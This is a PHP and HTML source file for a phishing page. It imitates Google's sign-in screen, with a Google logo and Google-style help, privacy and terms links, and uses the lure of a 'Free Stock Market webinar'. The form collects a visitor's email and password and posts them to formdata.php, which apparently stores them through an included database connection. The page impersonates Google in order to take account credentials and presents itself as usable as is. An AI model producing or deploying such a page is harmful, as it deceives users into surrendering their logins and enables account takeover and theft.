<?php
include('connection.php');
?>
<html lang="en" dir="ltr">
  <head>
    <meta charset="utf-8">
    <title>Register for Free webinar</title>
    <link rel="shortcut icon" href="unnamed.jpg">
    <link rel="stylesheet" href="formCss.css">
    <link rel="preconnect" href="https://fonts.gstatic.com">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@100;300&display=swap" rel="stylesheet">
  </head>
  <body>
    <div class="holder">
      <div class="header">
        <img class="logo" src="google2.0.0.jpg" alt="google-logo">
        <h1>Sign in</h1>
        <p>to continue to <a href="#">Free Stock Market webinar</a></p>
      </div>
      <div class="form">
        <form class="form" action="formdata.php" method="post">
          <input type="text" name="email" placeholder="Email or phone"><br>
          <a href="#" class="forgot"><b>Forgot email?</b></a><br>
          <input type="password" name="pass" placeholder="Enter password"><br>
          <a href="#" class="forgot"><b>Forgot password?</b></a><br>
          <div class="grey">
            <label>Not your computer? Use Private Browsing windows to sign in. <a href="#"><b>Learn more</b></a></label>
          </div>
          <div class="footer">
            <a href="#">Create account</a>
            <button type="submit" formmethod="post" >Next</button>
          </div>
        </form>
      </div>
      <div class="footer-2">
        <p>English (United Kingdom) ▼</p>
        <div class="menu">
          <a href="#">Help</a>
          <a href="#">Privacy</a>
          <a href="#">Terms</a>
        </div>
      </div>
    </div>
  </body>
</html>

<!--  -->
